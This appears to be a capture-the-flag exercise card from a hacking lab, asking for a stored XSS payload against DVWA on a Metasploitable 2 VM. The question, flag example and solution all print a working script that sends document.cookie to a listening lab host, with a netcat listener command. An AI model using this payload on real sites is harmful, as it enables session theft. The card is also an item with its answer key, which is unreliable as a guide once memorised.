# Q070 — DVWA Stored XSS

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On DVWA stored XSS guestbook, post a payload that steals `document.cookie` and sends to `http://192.168.52.128:8000/`. Provide the payload.

---

## 🎯 Flag Format

```
payload=<html>
```

Example: `payload=<script>new Image().src='http://192.168.52.128:8000/?c='+document.cookie</script>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Use `<img>` or `<script>` tag.
</details>

<details>
<summary>Hint 2</summary>

Run a netcat listener on Parrot to receive the cookie.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# Set up: nc -lvnp 8000 on Parrot
# Submit in Message field
```

Visiting the page exfiltrates cookies to attacker.

**Answer:** `payload=<script>new Image().src='http://192.168.52.128:8000/?c='+document.cookie</script>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q070".
```
